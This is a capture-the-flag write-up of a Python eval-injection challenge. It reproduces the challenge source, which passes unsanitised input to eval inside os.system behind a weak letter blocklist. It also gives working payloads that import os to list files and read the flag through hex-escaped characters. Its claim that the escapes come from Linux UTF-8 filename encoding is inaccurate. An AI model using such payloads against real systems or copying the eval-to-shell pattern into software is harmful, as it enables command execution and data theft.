PYTHON SANDBOX EXPLOIT

FOR MORE SUCH EXPLOITS REFER:[https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)

so this was one of the good question relating python

if you look at the source code :

#!/usr/local/bin/python

import os

FLAG_FILE = "FLAG"

def get_input() -> int:

print(''' ,#####,

#_ _#

|a` `a|

| u | ________________________

\ = / | WAYYANG |

|\___/| < TERMINAL v1.0 |

___ ____/: :\____ ___ |________________________|

.' `.-===-\ /-===-.` '.

/ .-"""""-.-"""""-. \

/' =:= '\

.' ' .: o -=:=- o :. ' `.

(.' /'. '-.....-'-.....-' .'\ '.)

/' ._/ ". --:-- ." \_. '\

| .'| ". ---:--- ." |'. |

| : | | ---:--- | | : |

\ : | |_____._____| | : /

/ ( |----|------| ) \

/... .| | | | |. ...\

|::::/'' jgs / | \ ''\::::|

'"""" /' .L_ `\ """"'

/'-.,__/` `\__..-'\

; / \ ;

: / \ |

| / \. |

|`../ | ,/

( _ ) | _)

| | | |

|___| \___|

:===| |==|

\ / |__|

/\/\ /"""`8.__

|oo| \__.//___)

|==|

\__/''')

print("What would you like to do today?")

print("1. Weather")

print("2. Time")

print("3. Tiktok of the day")

print("4. Read straits times")

print("5. Get flag")

print("6. Exit")

choice = int(input(">> "))

return choice

if __name__ == '__main__':

choice = get_input()

if choice == 1:

print("CLEAR SKIES FOR HANDSOME MEN")

elif choice == 2:

print("IT'S ALWAYS SEXY TIME")

elif choice == 3:

print("[https://www.tiktok.com/@benawad/video/7039054021797252399")](https://www.tiktok.com/@benawad/video/7039054021797252399)

elif choice == 4:

filename = input("which news article you want babe :) ")

not_allowed = [char for char in FLAG_FILE]

for char in filename:

if char in not_allowed:

print("NICE TRY. WAYYANG SEE YOU!!!!!")

os.system(f"cat news.txt")

exit()

try:

**os.system(f"cat {eval(filename)}")** ##this line##

except:

pass

elif choice == 5:

print("NOT READY YET. MAYBE AFTER CTF????")

look at “this line” when we choose 4 option anf don't give the filename as the characters in the array not_allowed i.e = [F L A G]

we get to evaluate a “filename” variable in the try section, thus this is the loophole of eval function we can a python sandbox code there as it acts as a sandbox,

this by giving the filename as : __import__('os').system('ls')

we get list of all files and thus run the command:

__import__('os').system('cat \x46\x4c\x41\x47')

this FLAG name is is converted to hexadecimal value as linux uses UTF-8 encoding to encode filenames with delimiter as /x